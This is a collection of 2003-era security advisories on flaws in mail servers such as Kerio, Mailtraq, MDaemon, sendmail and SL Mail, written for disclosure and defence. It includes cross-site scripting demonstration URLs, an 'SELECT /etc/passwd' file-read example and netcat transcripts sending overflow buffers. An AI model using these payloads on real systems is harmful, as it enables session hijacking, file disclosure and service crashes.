action=new&oldalias=eso&alias=aaa&folder=public&user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAA

An input validation flaw was reported in the 'add_acl' and 'do_map' modules.  The module does not properly filter HTML code from user-supplied input.  A remote user can create a specially crafted URL that, when loaded by an authenticated target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Kerio MailServer software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Some demonstration exploit URLs are provided:

http://[server]/add_acl?folder=~conde0@localhost/INBOX&add_name=<script>alert(document.cookie);</script>

http://[Server]/do_map?action=new&oldalias=eso&alias=<script>alert(document.cookie);</script>&folder=public&user=lucascavadora

The vendor has reportedly been notified.

A Spanish language version of the advisory is available at:

http://nautopia.org/vulnerabilidades/kerio_mailserver.htm
Impact':
A remote authenticated user can execute arbitrary code with system level privileges.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Kerio MailServer software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Qpopper Indicates Valid Account Status to Remote Users
Description:
A vulnerability was reported in the Qpopper e-mail server.  A remote user can determine if a specified account name is valid or not.
ConnecTalk reported that the POP server responds differently to a remote user if the user name supplied with the USER command is valid or not.  If a valid username and an invalid password is provided, the server will reportedly issue a negative response and wait for one additional command before closing the connection.  If an invalid username and and invalid password is provided, the server will reportedly issue a negative response and immediately close the connection.

The following notification timeline is provided:

Problem found: May 14, 2003
Vendor notification: May 14, 2003
Second vendor notification: May 21, 2003
Public notification: June 18, 2003

[Editor's note:  The author of the report has indicated that this vulnerability was reported on March 15, 2003 by Dennis Lubert (plasmahhinformatik.uni-bremen.de).  The March 2003 report was not captured in our database, so we are reporting the flaw here.  In that previous report, it was noted that the system will wait approximately 10 seconds after receiving a valid username and invalid password before disconnecting.]
Impact': A remote user can determine if a specified username exists on the server.
Solution: No solution was available at the time of this entry.

Title: Mailtraq Mail Server Has Multiple Flaws, Disclosing Files to Remote Users and Passwords to Local Users
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in the Mailtraq server.  A remote user can view files on the system located outside of the web document directory.  A remote user can cause denial of service conditions.  A local user can obtain and decode passwords.  A remote user can conduct cross-site scripting attacks.
SecurITeam reported that a remote user can view files on the system using the following type of URL:

http://[target]/Program%20Files/

It is also reported that the software stores passwords using a weak encoding algorithm.  A local user can obtain passwords stored in the 'C:\Program Files\Mailtraq\database\conguration' directory or in the target user's directory and can decode the passwords.  A demonstration exploit script is available at:

http://www.securiteam.com/windowsntfocus/5HP0G1FAAC.html

It is also reported that a remote user can send a specially crafted string with the MAIL FROM, RCPT TO, HELO, or FROM SMTP commands to cause the server to consume 100% of CPU resources if the target administrator is viewing the Event Log.  The resource consumption will reportedly last for a few seconds.

It is also reported that a remote user can send a long username and/or password to the authentication CGI script to cause the server to consume excessive CPU resources for a temporary period of time.

It is also reported that the server does not properly filter HTML code when displaying the 'Subject' field of an e-mail message.  A remote user can send an e-mail message with a specially crafted subject line so that when the target user receives and views the subject line, arbitrary scripting code will be executed by the target user's browser. The code will originate from the Mailtraq e-mail server and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.  The report indicates that a remote user can hijack a target user's session.
Impact':
A remote user can cause temporary denial of service conditions.

A remote user can view files on the system located outside of the web document directory.  Files can be viewed with the privileges of the mail server.

A local user can view passwords.

A remote user can access the target user's cookies (including authentication cookies), associated with the site running the vulnerable software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: The vendor has released a fixed version (2.3.2.1419), available from the vendor as a public beta release.

Title: UW-IMAP Server Flaws Disclose Files on the System to Remote Authenticated Users and Also Permit Remote File Operations
Description:
A vulnerability was reported in the University of Washington IMAP (uw-imap) server software.  A remote authenticated user can view, move, and delete files on the system.
An advisory was released by dr_insane reporting a vulnerability in SquirrelMail.  Another user (Alexandru Balan) reported that the flaw actually resides in uw-imap and can be exploited directly via the IMAP protocol (including via SquirrelMail).

According to the report, a remote authenticated user can view arbitrary files, delete files, and move files with the privileges of the mail server.  A remote user can reportedly use an IMAP command and specify a filename (with absolute file path) instead of the mailbox name to perform certain file operations on the specified file.  For example, it is reported that a remote user can issue the SELECT command with a file name to view a file on the system (e.g., 'SELECT /etc/passwd').

Some demonstration exploit URLs that use SquirrelMail as an attack vector are provided in the Source Message.
Impact': A remote authenticated IMAP user can view, move, and delete files on the system with the privileges of the IMAP server.
Solution: No solution was available at the time of this entry.

Title: ArGoSoft Mail Server Freeware Version Can Be Crashed By Remote Users
Description:
A denial of service vulnerability was reported in the ArGoSoft Mail Server.  A remote user can cause the mail server to crash.
Tripbit Security reported that a remote user can issue a large number of HTTP GET requests to the webmail interface to cause the server to crash.

According to the advisory, the Freeware version is vulnerable but the 1.8 Plus and 1.8 Pro versions are not vulnerable.

A demonstration exploit script is provided in the Source Message.

The vendor has reportedly been notified without response.
Impact': A remote user can cause the mail server to crash.
Solution: No solution was available at the time of this entry.

Title: MDaemon IMAP Buffer Overflows Let Remote Users Execute Arbitrary Code With System Privileges
Impact: Execution of arbitrary code via network
Description:
Dennis Rand at Infowarfare.dk reported several vulnerabilities in the MDaemon IMAP server.  A remote user can cause the IMAP service to crash or arbitrary code to execute with System privileges.
It is reported that there are several buffer overflows in the processing of the IMAP4 protocol.  A remote user can reportedly send a "large amount" of data with the EXAMINE, DELETE, SUBSCRIBE, RENAME, UNSUBSCRIBE, LIST, LSUB, STATUS, LOGIN, CREATE, and SELECT commands to trigger the overflow.  Some commands require the remote user to be authenticated but some do not.
Impact': A remote user can cause the IMAP service to crash or execute arbitrary code with System privileges.
Solution:
No solution was available at the time of this entry.

[Editor's note:  The latest version of MDaemon is 6.7.9.  The version reported to be vulnerable is 6.7.8.  We have asked the vendor if the latest version is also affected.]

Title: MERCUR Mail Server IMAP Buffer Overflows Let Remote Users Execute Arbitrary Code With System Privileges
Impact: Execution of arbitrary code via network
Description:
Dennis Rand at Infowarfare.dk reported several vulnerabilities in the MERCUR Mail Server.  A remote user can cause the IMAP service to crash or execute arbitrary code with System privileges.
It is reported that there are several buffer overflows in the processing of the IMAP4 protocol.  A remote user can reportedly send a "large amount" of data with the EXAMINE, DELETE, SUBSCRIBE, RENAME, UNSUBSCRIBE, LIST, LSUB, STATUS, LOGIN, CREATE, and SELECT commands to trigger the overflow.  Some commands require the remote user to be authenticated but some do not.

The amount of data sent must be less than 8000 characters, according to the report.

If the IMAP service crashes, it must be restarted manually to return to normal operations.

The following notification timeline is provided:

10/05/2003 Found the Vulnerability, and made an analysis.
13/05/2003 Reported to Vendor. 
14/05/2003 Received information from Vendor
06/06/2003 Public Disclosure.
Impact': A remote user can cause the IMAP service to crash or execute arbitrary code with System privileges.
Solution:
The vendor has released a fixed version (4.2.15.0).  Contact the vendor for more information:

http://www.atrium-software.com/mailserver/pub/contact.html

Title: Ability Mail Server Discloses Passwords to Local Users
Description:
Ziv Kamir reported a vulnerability in the Ability Mail Server.  A local user can view passwords.
It is reported that the server stores usernames and passwords in the '\Program Files\Code-Crafters\Ability Mail Server\config\accounts.dta' file in clear text.  A local user can view the file to obtain passwords.

The vendor has reportedly been notified (on June 4, 2003).
Impact': A local user can view passwords for the user accounts on the mail server.
Solution: No solution was available at the time of this entry.

Title: Mailtraq E-mail Server Discloses Script Source Code to Remote Users and Permits Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
Ziv Kamir reported several vulnerabilities in the Mailtraq e-mail server.  A remote user can view ASP source code, determine the installation path, and conduct cross-site scripting attacks.
It is reported that a remote user can append a period character ('.') to a URL request for an ASP script to view the source of the ASP script.  A demonstration exploit URL is provided:

http://[target]/browse.asp.

A remote authenticated user with WebMail privileges can reportedly determine the installation path by requesting the following type of URL:

http://[target]/browse.asp*

It is also reported that the 'browse.asp' script displays user-supplied input without filtering HTML code from the input.  A remote user can create a specially crafted URL that, when loaded by a target Mailtraq WebMail user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the Mailtraq server and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Some demonstration exploit URLs are provided:

http://[target]/browse.asp?cfolder=<script>alert(document.cookie)</script>

http://[target]/browse.asp?<script>alert(document.cookie)</script>

The vendor has reportedly been notified (on June 4, 2003).
Impact':
A remote user can view ASP source code.

A remote authenticated WebMail user can determine the installation path.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the Mailtraq server, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: BaSoMail Server Can Be Crashed By Remote Users and Also Discloses Passwords to Local Users
Impact: Execution of arbitrary code via network
Description:
Ziv Kamir reported several vulnerabilities in BaSoMail.  A remote user can cause the system to crash.  A local user can view e-mail passwords.
BaSoMail is formerly known as the "MailServer by SH39."  According to the report, the server stores e-mail passwords in plaintext on the system.  A local user can view those passwords.  Usernames and passwords are reportedly stored in the '\Program Files\BaSoMail\MailServer.dba' file.

It is also reported that a remote authenticated user can trigger a denial of service condition in the POP3 service by sending a LIST command with a negative integer parameter, followed by a DELE with a negative integer parameter, followed by the QUIT command.  The entire application will crash.

It is also reported that a remote user can trigger a buffer overflow in the SMTP server, causing the server to crash.  A remote user can send a large amount of data with the "HELO", "MAIL FROM", or the "RCPT TO" commands.  A buffer size of approximately 2100 bytes is required to cause the crash.  The affected command must be repeated 7 or 8 times to trigger the overflow.  The report did not indicate whether a remote user can execute arbitrary code or not.  

The vendor has reportedly been notified (on 28/05/2003).
Impact':
A remote user can cause the mail service to crash.

A local user can view user passwords.
Solution: No solution was available at the time of this entry.

Title: iPlanet Messaging Server HTML Attachment Viewing Permits Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the iPlanet Messaging Server.  A remote user can conduct cross-site scripting attacks against users on the mail server to steal session authentication information.
Infohacking Research reported that iPlanet Messaging Server permits HTML attachments to be viewed while online and in the security context of the web server.

A remote user can create a specially crafted HTML attachment that, when opened by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the iPlanet Messaging Server software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit attachment is provided:

<html>
<script>alert(document.URL)</script>
</html>
Impact': A remote user can access the target user's cookies (including authentication information), if any, associated with the site running the mail server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Magic WinMail Server Format String Flaw Lets Remote Users Crash the POP Server
Description:
A vulnerability was reported in Magic WinMail Server.  A remote user can cause the mail service to crash.
Damage Hacking Group reported that there is a format string vulnerability in the POP3 mail service.  A remote user can connect to the POP3 service on TCP port 110 and send format string characters as the username and password to cause the service to crash.

A demonstration exploit transcript is provided:

C:\>telnet 127.0.0.1 110
+OK alpha Magic Winmail Server 2.3(Build 0402) POP3 ready
user %n
+OK
pass %n
- -ERR authorization failed

The report did not indicate whether or not it is possible to execute arbitrary code via this flaw.
Impact': A remote user can cause the POP3 mail service to crash.
Solution:
The vendor released a fixed version (2.4), available at:

http://www.magicwinmail.net/download.asp

Title: ShareMailPro Discloses Valid Account Names to Remote Users
Description:
Ziv Kamir reported another vulnerability in ShareMailPro.  A remote user can determine if a specified user account name exists on the system.
It is reported that a remote user can query the POP3 interface to determine if a particular user account exists or not.  If the specified user does not exist, the server will respond with:

-ERR sorry , no such mailbox

If the specified user exists, the server will respond with:

+OK check your mailbox
Impact': A remote user can determine valid user accounts on the system.
Solution: No solution was available at the time of this entry.  The vendor has reportedly responded to indicate that they plan to fix this vulnerability.

Title: ShareMailPro Mail Server Discloses Some Administrative Information to Remote Authenticated Users
Description:
Ziv Kamir reported a vulnerability in the ShareMailPro e-mail server.  The server discloses some administrative information to remote authenticated users.
It is reported that a remote authenticated user that has been granted WebConfig privileges can perform some administrative actions via the WebConfig interface on port 3128.  The remote authenticated user can view the Server Services Status to monitor the working status of the mail server and can view a list of all users and each user's status.

The following demonstration exploit URLs are provided:

http://ShareMailPro's_IP:3128/status.htm

http://ShareMailPro's_IP:3128/mailbox.htm

The vendor has reportedly been notified (on May 19, 2003).
Impact': A remote authenticated user can view system status and a list of user e-mail accounts and each user's status.
Solution: No solution was available at the time of this entry.

Title: (Debian Issues Fix) Sendmail Temporary File Flaw May Let Local Users Gain Elevated Privileges
Description:
A temporary file access control vulnerability was reported in the sendmail mail server.  A local user may be able to obtain elevated privileges.
Paul Szabo reported a security vulnerability in the sendmail package to the Debian maintainers.  According to Debian, the flaws also affect the upstream distribution of sendmail.

Three programs installed as part of sendmail reportedly make unsafe use of temporary files.  A local user can create a symbolic link from one of the temporary files to another critical file on the system.  Then, when a target user executes the affected program, the linked file will be overwritten with the privileges of the target user.

The affected programs are listed:

/usr/bin/expn unsafely overwrites /tmp/expn$$

/usr/sbin/checksendmail unsafely overwrites /tmp/csm.in$$ and /tmp/csm$$

/usr/share/sendmail/doublebounce.pl unsafely overwrites /tmp/doubb$$
Impact': A local user may be able to obtain elevated privileges when a target user executes one of the affected programs on the system.  If the target user is a root level user, the local user may be able to obtain root privileges.
Solution:
Debian has released a fix in version 8.12.3-6.4 for the stable distribution (woody), in version 8.9.3-26.1 for the old stable distribution (potato), and in version 8.12.9-2 for the unstable distribution (sid).

Title: Sendmail Temporary File Flaw May Let Local Users Gain Elevated Privileges
Description:
A temporary file access control vulnerability was reported in the sendmail mail server.  A local user may be able to obtain elevated privileges.
Paul Szabo reported a security vulnerability in the sendmail package to the Debian maintainers.  According to Debian, the flaws also affect the upstream distribution of sendmail.

Three programs installed as part of sendmail reportedly make unsafe use of temporary files.  A local user can create a symbolic link from one of the temporary files to another critical file on the system.  Then, when a target user executes the affected program, the linked file will be overwritten with the privileges of the target user.

The affected programs are listed:

/usr/bin/expn unsafely overwrites /tmp/expn$$

/usr/sbin/checksendmail unsafely overwrites /tmp/csm.in$$ and /tmp/csm$$

/usr/share/sendmail/doublebounce.pl unsafely overwrites /tmp/doubb$$
Impact': A local user may be able to obtain elevated privileges when a target user executes one of the affected programs on the system.  If the target user is a root level user, the local user may be able to obtain root privileges.
Solution: No upstream (i.e., sendmail.org) solution was available at the time of this entry.

Title: MailMax IMAP Server SELECT Command Buffer Overflow Lets Remote Authenticated Users Execute Arbitrary Code With System Privileges
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the MailMax IMAP server.  A remote authenticated user can cause the service to crash or execute arbitrary code with System privileges.
It is reported that a remote authenticated user can send a specially crafted SELECT command to the server to trigger a buffer overflow and execute arbitrary code on the server.  

A demonstration exploit transcript is provided:

nc infowarfare.dk 143
* OK IMAP4rev1 SmartMax IMAPMax 5 Ready
0000 CAPABILITY
* CAPABILITY IMAP4rev1
0000 OK CAPABILITY completed
0001 LOGIN "RealUser@infowarfare.dk" "HereIsMyPassword"
0001 OK User authenticated.
0002 SELECT "aaa...[256]...aaaa"

The report indicates that the service will detect a buffer overflow and shut down.  The service must be manually restarted to return to normal operations.

The following disclosure timeline is provided:

11/04/2003 Recived a mail from Mark Litchfield, about this could be vulnerable 
           by sending a larger buffer. So credits should also go to Mark
15/04/2003 Made an analysis and found the vulnerability
28/04/2003 Reported the vulnerability to Vendor (support-at-smartmax.com)
02/05/2003 Recived responce from Vendor
17/05/2003 Public Disclosure.

Matrix at 0x36.org and Mark Litchfield are credited with discovering the flaw.
Impact': A remote authenticated user can cause the service to crash.  A remote authenticated user can cause arbitrary code to be executed with System privileges.
Solution:
The vendor has released a fixed version (5.5), available at:

http://www.smartmax.com/downloadproducts.aspx

Title: CMailServer SMTP Command Buffer Overflow Lets Remote Users Execute Arbitrary Code With System Privileges
Impact: Execution of arbitrary code via network
Description:
Dennis Rand at Infowarfare.dk reported several buffer overflow vulnerabilities in CMailServer.  A remote user can execute arbitrary code with System level privileges.
It is reported that a remote user can trigger an overflow in the server's processing SMTP protocol.  The remote user can overwrite the exception handler on the stack and execute code with System privileges.  The "MAIL FROM" and "RCPT TO" commands are affected.

A demonstration exploit transcript is provided:

nc warlab.dk 25
220 ESMTP CMailServer 4.0.2003.03.27 SMTP Service Ready
HELO Foobar
250 win2k-serv
Mail From : <aaaaa....[Buffer size 2000 Bytes @warlab.dk]
<Connection closed>

Some demonstration exploit code is included in the Source Message.

The following timeline is provided:

24/04/2003 Found the Vulnerability, and made an analysis.
29/04/2003 Contacted Vendor at support@youngzsoft.net 
30/04/2003 Received response from vendor with a fix to test
01/05/2003 New version tested negative for the vulnerabilities
10/05/2003 Public Disclosure.
Impact':
A remote user can cause the SMTP service to crash.

A remote user can execute arbitrary code with System level privileges.
Solution:
The vendor has reportedly released a fixed version (4.0.2003.03.30):

http://www.youngzsoft.net/download.htm

Title: ListProc 'catmail' Buffer Overflow Lets Local Users Grab Root Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in the ListProc mailing list software's 'catmail' helper application.  A local user can execute arbitrary code to gain root privileges.
Secure Network Operations Strategic Reconnaissance Team reported an exploitable buffer overflow in catmail in the ULISTPROC_UMASK environment variable.  A local user can set the variable to a specially crafted value to cause arbitrary code to be executed.  Because catmail is configured with set user id (setuid) root privileges, the code will yield root privileges to the local user.

A demonstration exploit script is available at:

http://safemode.org/files/zillion/exploits/List-Proc-catmail.pl
Impact': A local user can execute arbitrary code with root privileges to gain root level access on the system.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that, as a workaround, you can remove the setuid bit from the catmail application.

Title: SL Mail Server Has Multiple Buffer Overflows That Let Remote Users Execute Arbitrary Code With System Privileges
Impact: Execution of arbitrary code via network
Description:
Several buffer overflows were reported in SL Mail.  A remote user can execute arbitrary code with System level privileges to gain full control over the target system.
NGSSoftware Insight Security Research issued an advisory warning warning that the SMTP, POPPASSWD, and POP3 services are vulnerable.

A remote user can reportedly supply a specially crafted parameter to the ETRN SMTP command to overwrite the saved return address on the stack and execute arbitrary code.  The flaw is due to an unsafe lstrcat() function call in the slmail.exe process (which is different than the SMTP listener process), according to the report.  The arbitrary code will run with System account privileges in the default configuration.

The XTRN command is also reported to be affected.

A remote user can also reportedly connect to the POPPASSWD port (TCP 106) and supply a specially crafted string to trigger another buffer overflow and execute arbitrary code.

Finally, a remote user can connect to the POP3 port and supply a specially crafted password to trigger a separate buffer overflow and execute arbitrary code.
Impact': A remote user can execute arbitrary code on the target system with System level privileges.
Solution:
The vendor has reportedly issued a fixed version.  Contact the vendor for more information:

http://www.slmail.com/

The author of the report has provided some workaround instructions, available in the Source Message and at:

http://www.nextgenss.com/advisories/slmail-vulns.txt

Title: SLwebmail3 Discloses Files on the System to Remote Users and May Let Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in SLwebmail3.  A remote user can view arbitrary files on the system and can determine the installation path.  A remote user may be able to execute arbitrary code on the system.
NGSSoftware Insight Security Research reported that many of the product's ISAPI DLL applications contain buffer overflows.  A remote user can supply specially crafted values for certain parameters to trigger an overflow.  It may be possible to execute arbitrary code on the target system [however, the report did not confirm that].

Affected DLLs include showlogin.dll (Language parameter) and recman.dll, admin.dll, and globallogin.dll (CompanyID parameter) [CVE: CVE-2003-0266].

It is also reported that a remote user can access the ShowGodLog.dll to read arbitrary specified files with the privileges of the anonymous Internet account [CVE: CVE-2003-0267].

A remote user can also make an invalid request to some of the DLLs (e.g., WebMailReq.dll) to cause the system to display the installation path [CVE: CVE-2003-0268].
Impact':
A remote user can execute arbitrary code on the target system.

A remote user can view arbitrary specified files on the target system with the privileges of the web server.

A remote user can determine the installation path.
Solution:
The vendor has reportedly released a fix.  Contact the vendor for more information:

http://www.slmail.com/

Title: FTGate Pro Mail Server Buffer Overflows Let Remote Users Grab System Privileges
Impact: Execution of arbitrary code via network
Description:
Dennis Rand at Infoware.dk reported several buffer overflow vulnerabilities in the FTGate Pro mail server.  A remote user can cause the server to stop responding for 5 - 10 seconds and can cause the server to execute arbitrary code with System privileges.
It is reported that the server contains an overflow in the processing of ESMTP commands.  The "Mail From" and "RCPT TO" commands are reportedly affected.  A remote user can send a specially crafted parameter with these commands to trigger the overflow.

A demonstration exploit transcript is provided:

nc warlab.dk 25
220 win2k-serv ESMTP Server FTGate
HELO Foobar
250 win2k-serv
Mail From : <aaaaa....[BUFFER about 2000 Bytes @ and 2000 bytes again ending with ".com"]
<Connection closed>

A demonstration exploit script is provided in the Source Message.
Impact':
A remote user can cause the server to stop responding for a period of 5 - 10 seconds.  All connections will be dropped.

A remote user can execute arbitrary code with System level privileges.
Solution:
The vendor has released a fixed version (1.22 Build 1330), available from the vendor:

http://www.ftgate.com/content/44.htm

Title: CommuniGate Pro Webmail May Disclose User Session IDs to Remote Users
Description:
A vulnerability was reported in the CommuniGate Pro e-mail server's Webmail interface.  A remote user may be able to gain access to a target user's mailbox in certain situations.
It is reported that the Webmail interface discloses an authenticated user's Session ID value via the HTTP Referer field when downloading images.  A remote user can send a specially crafted e-mail to the target user, where the e-mail contains a reference to an IMG SRC located on the remote user's server.  When the target user receives the e-mail message, the target user's browser will disclose the Session ID to the remote user's server.  The remote user can then hijack the target user's Webmail session and gain access to the target user's e-mail.

According to the report, the remote user can access the Webmail account from any IP address, unless IP session control is enabled, in which case the remote user can access the Webmail account only from the target user's IP address.

Some demonstration exploit code is provided in the Source Message.
Impact': A remote user may be able to obtain a target user's Session ID and gain access to that target user's Webmail.
Solution: According to the report, the vendor has stated that version 4.1b2 is not vulnerable when configured with the UseCookies option.

Title: MDaemon POP3 Mail Service 'UIDL' and 'DELE' Command Signed Integer Flaw Lets Remote Authenticated Users Crash the Service
Description:
A denial of service vulnerability was reported in the MDaemon POP3 mail service.  A remote authenticated user can cause the service to crash.
Damage Hacking Group reported that a remote authenticated user connected to the POP3 server can issue a UIDL or DELE command with a negative integer specified to trigger the flaw.  A demonstration exploit command is provided:

dele -1
Impact': A remote authenticated user can cause the mail service to crash.
Solution: No solution was available at the time of this entry.

Title: MDaemon Mail Server IMAP Buffer Overflow Lets Remote Authenticated Users Execute Arbitrary Code with System Privileges
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the MDaemon mail server.  A remote authenticated user can execute arbitrary code on the IMAP server.
Damage Hacking Group reported that the software does not perform proper bounds checking on the IMAP 'create' command.  A remote authenticated user can create a specially crafted mailbox name, where the name is larger than 1 kb, to cause the mail services to crash and overwrite the EAX and EDI registers.  Arbitrary code can be executed with System level privileges.

A demonstration exploit script is provided in the Source Message.
Impact': A remote authenticated user can cause the mail services to crash.  A remote authenticated user can execute arbitrary code with System level privileges.
Solution: No solution was available at the time of this entry.

Title: Qpopper 'poppassd' Path Specification Feature Lets Local Users Execute Arbitary Code with Root Privileges
Impact: Execution of arbitrary code via local system
Description:
INetCop issued a security advisory warning of a vulnerability in Qpopper's poppassd password changer daemon.  A local user can gain root privileges on the system.
The vulnerability reportedly resides in the dochild() function in the 'poppassd.c' file, where the 'smbpasswd' function is called with set user id (setuid) root privileges.  A local user can invoke poppassd with the '-s' command line switch to specify the path of the smbpasswd binary.  This allows the local user to create an alternate smbpasswd executable containing arbitrary code and have poppassd execute the file with root privileges.
Impact': A local user can execute arbitrary code with root privileges.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that, as a workaround, you can remove the setuid bit from poppassd:

# chmod -s poppassd

Title: (Debian Issues Fix for 'sendmail-wide') Sendmail Buffer Overflow in Parsing Addresses May Let Remote or Local Users Execute Arbitrary Code With Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Sendmail in the address parsing code.  A remote or local user could cause arbitrary code to be executed with root privileges.
The flaw reportedly resides in 'parseaddr.c' in a char to int variable conversion.  Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

The vendor is reporting this as a "critical security problem."

The vendor credits Michal Zalewski for reporting the flaw.
Impact': A remote or local user could cause arbitrary code to be executed with root privileges.
Solution:
Debian has released a fix for the 'sendmail-wide' package.  The fix is included in version 8.12.3+3.5Wbeta-5.4 for the stable distribution (woody), in version 8.9.3+3.2W-25 for the old stable distribution (potato), and in version 8.12.9+3.5Wbeta-1 for the unstable distribution (sid).
